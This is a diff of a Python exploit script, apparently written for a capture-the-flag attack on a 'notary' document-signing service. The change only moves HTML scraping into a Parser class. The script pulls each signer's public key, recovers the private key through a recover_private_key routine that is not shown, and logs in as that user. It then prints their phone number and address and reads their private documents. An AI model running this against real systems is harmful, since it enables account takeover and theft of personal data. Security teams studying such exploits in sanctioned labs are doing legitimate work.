@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
 
-import re
 import sys
 import math
 import gmpy
@@ -8,6 +7,7 @@ import bisect
 import requests
 
 import notary
+from parse import Parser
 
 
 def count_splits(bits, n):
@@ -82,10 +82,10 @@ def recover_private_key(N, e):
 
 def recover_user_credentials(url, user_url):
     html = requests.get(url + user_url).text
-    
-    username = re.search(r'<h2>(.*?)\'s profile</h2>', html).group(1)
 
-    public_key = re.search(r'<strong>Public key</strong>: <code>(.*?)</code>', html).group(1)    
+    username = Parser(html).username()
+
+    public_key = Parser(html).public_key()
     N, e = notary.load_numbers(notary.deserialize_bytes(public_key))
 
     N, p, q, e, d = recover_private_key(N, e)
@@ -103,26 +103,27 @@ def main():
     url = f'http://{IP}:{PORT}'
 
     html = requests.get(url).text
-    data_urls = re.findall(r'<a href="(/doc/.*?)">.*?<p>(.*?)</p>.*?Signed by <a href="(/user/.*?)">', html, re.DOTALL)
+    cards = Parser(html).document_cards()
 
-    for document_url, text, user_url in data_urls:
+    for document_url, text, user_url in cards:
         username, password = recover_user_credentials(url, user_url)
 
         session = requests.session()
-        
+
         html = session.get(url + '/login').text
-        csrf_token = re.search(r'<input id="csrf_token" name="csrf_token" type="hidden" value="(.*?)">', html).group(1)
+        csrf_token = Parser(html).csrf_token()
 
         profile = session.post(url + '/login', data={'csrf_token': csrf_token, 'username': username, 'password': password}).text
-        
-        phone = re.search(r'<div> <strong>Phone</strong>:(.*?)</div>', profile, re.DOTALL).group(1)
-        address = re.search(r'<div> <strong>Address</strong>:(.*?)</div>', profile, re.DOTALL).group(1)
+
+        parser = Parser(profile)
+        phone = parser.phone()
+        address = parser.address()
 
         print(username, phone, address)
 
         if 'Private document' in text:
             html = session.get(url + document_url).text
-            content = re.search(r'<p>(.*?)</p>', html).group(1)
+            content = Parser(html).document_text()
             
             print(document_url, content)
 
